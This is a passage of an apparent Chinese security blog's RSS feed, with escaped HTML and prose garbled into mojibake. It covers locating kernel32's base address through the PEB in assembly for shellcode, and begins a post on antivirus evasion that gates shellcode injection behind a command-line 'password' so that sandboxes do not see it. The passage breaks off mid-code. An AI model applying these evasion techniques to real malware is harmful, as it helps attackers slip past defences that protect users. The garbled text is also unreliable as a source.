3ã€æŸ¥è¯¢è‡³InloadOrderMudleListä¸­çš„Flinkï¼ŒBlinkåŒå‘é“¾è¡¨æ—¶å…¶åœ°å€ä¸º ??? ï¼Œè¿™æ˜¯æ“ä½œç³»ç»Ÿå¯¹å†…æ ¸æ•°æ®ç»“æ„çš„ä¿æŠ¤è¿›è¡Œçš„éšè—ï¼Œæˆ‘åˆ†åˆ«åœ¨Win10ï¼ŒWin10(è™šæ‹Ÿæœº)ï¼ŒWin11ä¸‰å°æœºå™¨ä¸Šæ“ä½œå‘ç°åªæœ‰Win10(è™šæ‹Ÿæœº)è¿›è¡Œäº†å­—æ®µéšè—ï¼Œåªæ˜¾ç¤º ???ï¼Œè¿™ä¸ªé—®é¢˜æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆè§£å†³ï¼Œçœ‹æƒ…å†µåº”è¯¥æ˜¯åªæœ‰è™šæ‹Ÿæœºä¼šå‡ºç°ï¼Œè¿˜æœ›æ‡‚çš„å¤§ä½¬èƒ½å¸®ä¸€æ‰‹ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hnriy3p62qj30pf0a4q3t.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnrjm8yshdj30nq09y409.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;kernel32åŸºå€å¯»å€çš„ä¸¤æ¡è·¯çº¿&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kernel32åŸºå€å¯»å€çš„ä¸¤æ¡è·¯çº¿&#34;&gt;#&lt;/a&gt; Kernel32 åŸºå€å¯»å€çš„ä¸¤æ¡è·¯çº¿&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;å¦‚ä½•ä½¿ç”¨Windbgåœ¨PEBå¯»æ‰¾åˆ°kernel32åŸºå€è¿™é‡Œä¸å±•å¼€è¯´äº†æœ‰å¾ˆå¤šç›¸å…³çš„æ–‡ç« å¯ä»¥çœ‹ï¼Œè¿™é‡Œä¸»è¦çš„å†…å®¹æ˜¯æˆ‘åœ¨è°ƒè¯•å¯»å€è¿‡ç¨‹ä¸­å‘ç°çš„ä¸€äº›é—®é¢˜ã€‚
ç¬¬ä¸€æ¡è·¯çº¿ï¼šè¿™æ˜¯æœ€å¸¸è§çš„ä¸€æ¡å³é€šè¿‡InloadOrderMudleList:Flinkè¿™æ¡é“¾ä¸€ç›´å¾€ä¸‹è·Ÿå°±èƒ½æ‰¾åˆ°Kernel32çš„DllBaseï¼Œæ±‡ç¼–ä»£ç ï¼š
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;figure class=&#34;highlight x86asm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;fs&lt;/span&gt;:[&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;]     //æ‰¾PEB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x0c&lt;/span&gt;]  //è·å–Ldr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x0c&lt;/span&gt;]  //è·å–InloadOrderMudleList:Flink&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;]         //è·å–InloadOrderLinks:Flink =&amp;gt; xxx&lt;span class=&#34;number&#34;&gt;.&lt;/span&gt;exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;]         //è·å–InloadOrderLinks:Flink =&amp;gt; ntdll&lt;span class=&#34;number&#34;&gt;.&lt;/span&gt;dll&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;]  //è·å–kernel32 DLLBaseä¹Ÿå°±æ˜¯åŸºåœ°å€&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; dwKernel32Addr, &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 ç¬¬äºŒæ¡è·¯çº¿ï¼šåœ¨æœ€å…ˆå¼€å§‹ç ”ç©¶çš„æ—¶å€™æˆ‘ä»¥ä¸ºè¿™æ¡è·¯çº¿å°±æ˜¯ç¬¬ä¸€æ¡è·¯çº¿ï¼Œä½†éšç€è°ƒè¯•çš„è¿‡ç¨‹ä¸­å‘ç°è¿™åœ°å€ä¸å¯¹å•Šï¼æˆ‘è¿˜ä»¥ä¸ºæ˜¯æ“ä½œç³»ç»Ÿé€ æˆçš„åŒºåˆ«å¯¼è‡´åœ°å€ä¸ä¸€ï¼Œä½†æ˜¯æˆ‘è¿è¡Œäº†è¿™ä¸¤æ®µä»£ç éƒ½æˆåŠŸæŒ‡å‘åŒä¸€ä¸ªåœ°å€ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ Kernel32 çš„åŸºå€&lt;br /&gt;
 &lt;figure class=&#34;highlight x86asm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;fs&lt;/span&gt;: [&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;]      //æ‰¾åˆ°PEB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x0c&lt;/span&gt;]    //æ‰¾LDR&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;]    //InMemoryOrderModuleList:Flink&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;]           //InLoadOrderLinks:&lt;span class=&#34;string&#34;&gt;&amp;quot;shellcode.exe&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;]           //InLoadOrderLinks:&lt;span class=&#34;string&#34;&gt;&amp;quot;ntdll.dll&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;]    //InInitializationOrderLinks:Flink =&amp;gt; DllBase&lt;span class=&#34;string&#34;&gt;&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; dwKernel32Addr, &lt;span class=&#34;built_in&#34;&gt;eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 ä»”ç»†è§‚å¯Ÿä¸Šè¿°ä¸¤æ®µå¯»å€æ±‡ç¼–ä¼šå‘ç°é™¤äº†è·å– Ldr å†…çš„ MudleList ä¸åŒå’Œæœ€åä¸åŒï¼Œå…¶ä»–æ‰¾çš„æ­¥éª¤éƒ½æ˜¯ä¸€æ ·ï¼Œé‚£æˆ‘ä»¬çœ‹çœ‹ä¸¤æ¡è·¯çº¿åœ¨ Windbg ä¸­æœ€ååˆ†åˆ«æ˜¯ä»€ä¹ˆ&lt;br /&gt;
&lt;img data-src=&#34;//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnrkh9hfh8j30yy07twgy.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnrkhb2uquj30wn07vdhu.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;å¯ä»¥å¾ˆæ˜æ˜¾çœ‹åˆ°è¿™ä¸¤ä¸ªå­—æ®µéƒ½æŒ‡å‘äº†0x76fd0000ï¼Œä½†æ˜¯åé¢ä¸ºä»€ä¹ˆInInitializationOrderLinks:Flinkçš„åœ°å€å°±æ˜¯Kernel32åŸºå€è€Œä¸æ˜¯DLLBaseå‘¢ï¼Ÿæ ¹æ®ç½‘ä¸Šä¼—å¤šèµ„æ–™æ”¶é›†æ¥çš„ä¿¡æ¯æ¥çœ‹å¯èƒ½æ˜¯å› ä¸ºç‰ˆæœ¬çš„åŸå› é€ æˆçš„ï¼Œå…¶çœŸæ­£çš„åŸºå€éœ€è¦åœ¨DllBaseçš„åœ°å€ä¸Šå›æ»š8ä¸ªå­—èŠ‚(ä¹Ÿå°±æ˜¯å›¾ä¸­ä» 0x18 ==&amp;gt; 0x10)ï¼Œæ‰€ä»¥æ‰å˜æˆäº†Flinkçš„åœ°å€ã€‚å…¶ä¸­Ldrå†…ä¸‰ä¸ªæ¨¡å—éƒ½èƒ½æ‰¾åˆ°Kernel32åŸºå€(é™¤äº†ä¸Šè¿°ä¸¤æ¡è¿˜æœ‰InInitializationOrderModuleList)ï¼Œåªä¸è¿‡ç°åœ¨åªæœ‰ç¬¬ä¸€æ¡è·¯çº¿æ˜¯ä¸éœ€è¦å›æ»šå­—èŠ‚çš„ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hnrkqcctmbj30x30cftbx.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;è‡³äºè¦å›æ»šå­—èŠ‚çš„èƒŒåçš„åº•å±‚åŸå› æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œè¿˜è¯·çŸ¥é“çš„å¤§ä½¬æ•™æ•™ï½ï½&lt;/strong&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://shut-td.github.io/%E7%BB%99EXE%E4%B8%8A%E9%94%81/</guid>
            <title>ç»™EXEä¸Šé”</title>
            <link>https://shut-td.github.io/%E7%BB%99EXE%E4%B8%8A%E9%94%81/</link>
            <category term="å…æ€" scheme="https://shut-td.github.io/categories/%E5%85%8D%E6%9D%80/" />
            <category term="å…æ€" scheme="https://shut-td.github.io/tags/%E5%85%8D%E6%9D%80/" />
            <pubDate>Thu, 14 Mar 2024 18:15:25 +0800</pubDate>
            <description><![CDATA[ &lt;pre&gt;&lt;code&gt;åœ¨å…æ€ä¸­æˆ‘ä»¬å¸¸å¸¸ä¼šç”¨å„ç§åŠ å¯†æ‰‹æ®µå°†shellcodeè¿›è¡Œå˜å½¢ä»¥è¾¾åˆ°ç»•è¿‡æ€è½¯çš„é™æ€æ£€æµ‹åˆ†æï¼Œæ¯”å¦‚è¯´æœ€å¸¸è§çš„å¼‚æˆ–ï¼Œbase64ç¼–ç ï¼Œaesï¼Œrsaï¼Œeccç­‰ï¼Œå½“ç„¶é™æ€æŸ¥æ€å¹¶ä¸æ˜¯æˆ‘ä»¬ä¸»è¦è¦è§£å†³çš„ï¼Œå› ä¸ºé™æ€æŸ¥æ€æ˜¯æœ€å®¹æ˜“ç»•è¿‡çš„åŸºæœ¬ä¸Šç”¨å¼‚æˆ–å°±å¯ä»¥è§£å†³ï¼Œä»Šå¤©æˆ‘ä»¬çš„ä¸»é¢˜æ˜¯ç»•è¿‡æ€è½¯çš„åŠ¨æ€æŸ¥æ€ã€‚
å…ˆè¯´è¯´æˆ‘è®¤ä¸ºçš„æ€è½¯æŸ¥æ€æ¶æ„æ–‡ä»¶çš„æ–¹æ³•å§ï¼Œç¬¬ä¸€ç§å°±æ˜¯é™æ€æŸ¥æ€ï¼Œåªé€šè¿‡æœç´¢å…¶æœ‰æ— æ¶æ„è½¯ä»¶çš„é™æ€ç‰¹å¾è¿›è¡ŒæŸ¥æ€ï¼Œè¿™ç§æ˜¯æœ€å®¹æ˜“ç»•è¿‡çš„åŸºæœ¬ä¸Šå¯¹æ¶æ„ä»£ç è¿›è¡Œç®€å•çš„å˜å½¢å°±å¯ä»¥ç»•è¿‡äº†ï¼›ç¬¬äºŒç§å°±æ˜¯åŠ¨æ€æŸ¥æ€ï¼Œå³ç”¨ä¸€ä¸ªæ²™ç®±å»æ¨¡æ‹Ÿæ‰§è¡Œä½ çš„æ–‡ä»¶çœ‹æ˜¯å¦ä¼šæ‰§è¡Œåˆ°æŸäº›æ•æ„Ÿæ“ä½œä¸Šå»ï¼›ç¬¬ä¸‰ç§æ˜¯å†…å­˜æŸ¥æ€å’Œè¡Œä¸ºç›‘æ§ï¼Œè¿™ä¹Ÿæ˜¯æœ€ä¸ºéš¾ç»•è¿‡çš„ï¼Œå› ä¸ºä¸ç®¡ä½ shellcodeåœ¨æ‰§è¡Œå‰æ˜¯ä»€ä¹ˆæ ·çš„åŠ è½½åˆ°å†…å­˜ä¸­å»å°±ä¼šç°å‡ºåŸå½¢ä»è€Œè¢«æ£€æŸ¥åˆ°ï¼Œè¿˜æœ‰åœ¨ä½ å»æ‰§è¡Œå‘½ä»¤æ—¶ä¸å¯é¿å…çš„ä¼šå‘å¤–è”åœ°å€å‘é€æ•°æ®ï¼Œè¿™å…¶ä¸­çš„æµé‡ç‰¹å¾ä¹Ÿæ˜¯éš¾ä»¥æ›´æ”¹çš„å› æ­¤å¾ˆå®¹æ˜“è¢«æ•æ‰åˆ°ï¼Œè¿™ä¹Ÿå°±æ˜¯æœ‰äº›æˆ‘ä»¬å¯ä»¥ä¸Šçº¿ä½†ä¸€æ‰§è¡Œå‘½ä»¤å°±å¯„äº†çš„åŸå› ã€‚
å¥½ï¼Œç®€å•å™è¿°å®ŒæŸ¥æ€åŸå› ï¼Œæˆ‘ä»¬æ¥æ­¥å…¥ä»Šå¤©çš„ä¸»é¢˜ï¼Œå¦‚ä½•è½»æ¾ç»•è¿‡ç¬¬äºŒç§æŸ¥æ€ã€‚é¦–å…ˆä¹Ÿæ˜¯æœ€ä¸ºé‡è¦çš„ä¸€ç‚¹ï¼Œé‚£å°±æ˜¯æˆ‘ä»¬çš„exeæ–‡ä»¶åé¢æ˜¯å¯ä»¥è·Ÿå‚æ•°çš„ï¼Œä¸¾ä¸ªä¾‹å­ï¼š
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* argv[])&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;å‚æ•°ä¸ªæ•°ï¼š%d&amp;quot;&lt;/span&gt;, argc);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;ç¬¬å‡ ä¸ªå‚æ•°ï¼š%s-%s&amp;quot;&lt;/span&gt;, argv[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;], argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;pause&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;img data-src=&#34;//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp2u9hz3j30vp0pjwfe.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°è¾“å‡ºçš„å‚æ•°ï¼Œå…¶ä¸­ argc æ˜¯å‘½ä»¤è¡Œä¸­å‚æ•°ä¸ªæ•° (åŒ…æ‹¬äº†è¿™ä¸ªæ–‡ä»¶å)ï¼Œå…¶ä¸­ argv ä¸­å­˜å‚¨çš„æ˜¯å‘½ä»¤è¡Œä¸­æ‰€æœ‰çš„å‚æ•°ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp2wjah4j30vn0plq4a.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;æ—¢ç„¶å¯ä»¥è·Ÿå‚æ•°å–å‚æ•°ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åƒè®¾ç½®å¯†ç ä¸€æ ·æ§åˆ¶ç¨‹åºçš„æµç¨‹ï¼Œä»è€Œç»•è¿‡æŸäº›æ£€æµ‹æœºåˆ¶ã€‚&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Hello&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Hello World&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;InjectShellcode&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Inject shellcode!!!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* argv[])&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (argc &amp;gt;= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((std::string)argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] == &lt;span class=&#34;string&#34;&gt;&amp;quot;123456&amp;quot;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;InjectShellcode&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;Hello&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span 